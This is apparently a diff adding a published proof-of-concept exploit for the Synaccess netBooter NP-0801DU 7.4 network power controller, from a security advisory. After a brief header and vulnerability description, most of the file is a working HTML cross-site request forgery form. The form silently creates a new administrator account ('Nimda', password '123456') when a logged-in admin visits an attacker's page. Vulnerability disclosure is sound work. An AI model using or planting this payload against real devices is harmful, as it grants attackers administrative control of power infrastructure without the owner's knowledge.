@@ -1,0 +1,28 @@
+# Title: Synaccess netBooter NP-0801DU 7.4 - Cross-Site Request Forgery (Add Admin)
+# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
+# Exploit Date: 2018-11-17
+# Vendor: Synaccess Networks Inc.
+# Product web page: https://www.synaccess-net.com
+# Affected version: NP-0801DU (HW6.0 BL1.5 FW7.23 WF7.4)
+# Tested on: Synaccess server
+# CVE: N/A
+# Advisory ID: ZSL-2018-5501
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5501.php
+
+# Desc: The application interface allows users to perform certain
+# actions via HTTP requests without performing any validity checks
+# to verify the requests. This can be exploited to perform certai
+# actions with administrative privileges if a logged-in user visits
+# a malicious web site.
+
+<html>
+  <body>
+   <form action="http://10.0.0.19:8082/adm.htm" method="POST">
+     <input type="hidden" name="add1" value="Nimda" />
+     <input type="hidden" name="add2" value="123456" />
+     <input type="hidden" name="add3" value="123456" />
+     <input type="hidden" name="adm0" value="1" />
+     <input type="submit" value="Gou" />
+   </form>
+  </body>
+</html>
